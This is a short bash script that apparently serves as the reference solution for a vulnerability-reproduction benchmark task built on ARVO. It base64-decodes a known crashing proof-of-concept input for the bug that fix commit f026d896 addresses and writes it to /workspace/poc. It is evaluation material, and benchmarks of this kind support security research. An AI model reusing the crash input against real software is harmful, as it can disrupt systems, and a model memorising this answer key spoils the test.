#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit f026d896 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
rsOursOurq6urq6uea6urq4BACAgICAgICAgIEQgICAgICAgICAgICAgIPT/9PT09AMgICAgA+i/IBR5YQMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIK7///8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICD//yAgICAgIKcgIKQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICD/ICAgICAgICAgICAgICAgIK4gICAgICAgICAgICAgICAgICAgICAgICCBIAAg//82ICAgICAgICCnICAgICAgID//ICAgICAgICAgICAg
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
